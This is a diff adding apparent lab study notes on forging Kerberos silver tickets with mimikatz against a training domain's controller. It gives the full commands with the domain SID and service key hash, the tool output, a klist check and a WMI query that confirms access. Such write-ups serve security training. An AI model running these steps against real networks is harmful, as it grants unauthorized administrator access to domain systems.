@@ -88,4 +88,115 @@ dcorp-dc
 
 ## Silver Ticket WMI
 
+In order to use silver ticket  for access using WMI, it's necesary use a couple of tickets. For HOST service and RPCSS service:
+```
+C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt
+User      : Administrator
+Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
+SID       : S-1-5-21-719815819-3726368948-3917688648
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 9407a301944bf60d059322952f56718a - rc4_hmac_nt
+Service   : HOST
+Target    : dcorp-dc.dollarcorp.moneycorp.local
+Lifetime  : 5/1/2023 8:45:17 AM ; 5/1/2023 6:45:17 PM ; 5/8/2023 8:45:17 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
+
+mimikatz(commandline) # exit
+Bye!
+
+C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt
+User      : Administrator
+Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
+SID       : S-1-5-21-719815819-3726368948-3917688648
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 9407a301944bf60d059322952f56718a - rc4_hmac_nt
+Service   : RPCSS
+Target    : dcorp-dc.dollarcorp.moneycorp.local
+Lifetime  : 5/1/2023 8:45:29 AM ; 5/1/2023 6:45:29 PM ; 5/8/2023 8:45:29 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+Review the ticket:
+```
+ klist
+
+Current LogonId is 0:0x5136f59
+
+Cached Tickets: (3)
+
+#0>     Client: Administrator @ dollarcorp.moneycorp.local
+        Server: RPCSS/dcorp-dc.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 5/1/2023 8:45:29 (local)
+        End Time:   5/1/2023 18:45:29 (local)
+        Renew Time: 5/8/2023 8:45:29 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+
+#1>     Client: Administrator @ dollarcorp.moneycorp.local
+        Server: HOST/dcorp-dc.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 5/1/2023 8:45:17 (local)
+        End Time:   5/1/2023 18:45:17 (local)
+        Renew Time: 5/8/2023 8:45:17 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+```
+
+Mike an WMI connection to the target domain controller using powershell:
+
+```
+gwmi -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+
+SystemDirectory : C:\Windows\system32
+Organization    :
+BuildNumber     : 20348
+RegisteredUser  : Windows User
+SerialNumber    : 00454-30000-00000-AA745
+Version         : 10.0.20348
+
+```
